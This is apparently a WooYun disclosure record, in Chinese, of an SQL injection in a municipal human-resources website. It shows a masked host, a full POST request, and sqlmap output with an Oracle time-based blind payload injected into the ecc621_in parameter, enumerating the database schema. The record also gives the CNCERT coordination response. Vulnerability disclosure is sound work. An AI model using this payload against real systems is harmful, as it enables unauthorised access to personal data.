wybug_title: 某市人力资源网一枚SQL注入漏洞
wybug_status: 已交由第三方合作机构(cncert国家互联网应急中心)处理
wybug_detail:
漏洞详情 披露状态：   									2015-11-01：	细节已通知厂商并且等待厂商处理中									2015-11-05：	厂商已经确认，细节仅向厂商公开									2015-11-15：	细节向核心白帽子及相关领域专家公开									2015-11-25：	细节向普通白帽子公开									2015-12-05：	细节向实习白帽子公开									2015-12-20：	细节向公众公开  简要描述： . 详细说明：  
http://**.**.**.**/masjyweb/i/onlineInvite/all

POST /masjyweb/i/onlineInvite/all HTTP/1.1Host: **.**.**.**User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:41.0) Gecko/20100101 Firefox/41.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateDNT: 1Referer: http://**.**.**.**/masjyweb/i/onlineInvite/allCookie: JSESSIONID=298C708D4F698E1563DBA1CB9D68234B; pgv_pvi=2177862656; pgv_si=s9181304832; _gscu_931430362=46295485zyo88e18; _gscs_931430362=46295485y4z4yg18|pv:15; _gscbrs_931430362=1Connection: keep-aliveContent-Type: application/x-www-form-urlencodedContent-Length: 134ecc621_name=%E9%80%89%E6%8B%A9%2F%E4%BF%AE%E6%94%B9&ecc621=&ecc621_in=%E5%AD%A6%E4%B9%A0&aac004=2&aac011=07&acb21i=005&agel=18&ager=27
   漏洞证明：  
sqlmap resumed the following injection point(s) from stored session:---Parameter: ecc621_in (POST)    Type: AND/OR time-based blind    Title: Oracle AND time-based blind    Payload: ecc621_name=%E9%80%89%E6%8B%A9/%E4%BF%AE%E6%94%B9&ecc621=&ecc621_in=%E5%AD%A6%E4%B9%A0%' AND 6013=DBMS_PIPE.RECEIVE_MESSAGE(CHR(72)||CHR(100)||CHR(67)||CHR(77),5) AND '%'='&aac004=2&aac011=07&acb21i=005&agel=18&ager=27---[21:07:57] [INFO] the back-end DBMS is Oracleweb server operating system: Windowsweb application technology: Apache 2.2.14back-end DBMS: Oracle[21:07:57] [WARNING] schema names are going to be used on Oracle for enumeration as the counterpartto database names on other DBMSes[21:07:57] [INFO] fetching database (schema) names[21:07:57] [INFO] fetching number of databases[21:07:57] [WARNING] time-based comparison requires larger statistical model, please wait..............................do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y[21:08:04] [WARNING] it is very important not to stress the network adapter during usage of time-based payloads to prevent potential errors[21:08:06] [INFO] adjusting time delay to 1 second due to good response times[21:08:08] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'[21:08:08] [ERROR] unable to retrieve the number of databases[21:08:08] [INFO] falling back to current database[21:08:08] [INFO] fetching current database[21:08:08] [INFO] resumed: MASJYWEB[21:08:08] [WARNING] on Oracle you'll need to use schema names for enumeration as the counterpart to database names on other DBMSesavailable databases [1]:[*] MASJYWEB
   修复方案：     版权声明：转载请注明来源 路人甲@乌云
wybug_reply: 漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2015-11-05 14:40 厂商回复： CNVD确认并复现所述漏洞情况，已经转由CNCERT下发对应分中心，由其后续协调网站管理单位处置。  最新状态： 暂无
